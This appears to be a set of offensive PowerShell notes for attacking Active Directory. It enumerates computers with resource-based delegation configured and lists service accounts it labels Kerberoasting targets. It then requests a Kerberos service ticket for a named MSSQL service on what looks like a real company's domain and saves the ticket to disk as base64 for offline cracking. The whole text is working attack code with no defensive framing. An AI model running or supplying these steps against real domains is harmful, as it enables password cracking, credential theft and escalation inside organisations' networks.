# Enumerate computers with delegation configured
$searcher = New-Object DirectoryServices.DirectorySearcher
$searcher.Filter = "(&(objectClass=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))"
$searcher.PageSize = 1000
$searcher.FindAll() | ForEach-Object { $_.Properties["name"] }

# Enumerate all user SPNs (Kerberoasting targets) — native LDAP, no Impacket
$searcher2 = New-Object DirectoryServices.DirectorySearcher
$searcher2.Filter = "(&(objectClass=user)(servicePrincipalName=*)(!userAccountControl:1.2.840.113556.1.4.803:=2))"
$searcher2.FindAll() | ForEach-Object {
    "$($_.Properties['samaccountname']) — $($_.Properties['serviceprincipalname'])"
}


## TGS Request
Add-Type -AssemblyName System.IdentityModel

$spn = "MSSQLSvc/DLO.GREAVESCOTTON.COM:DLO8"

$token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn

$ticketBytes = New-Object byte[] ($token.BinaryLength)
$token.GetBinaryForm($ticketBytes, 0)

[System.Convert]::ToBase64String($ticketBytes) | Out-File C:\ticket.b64






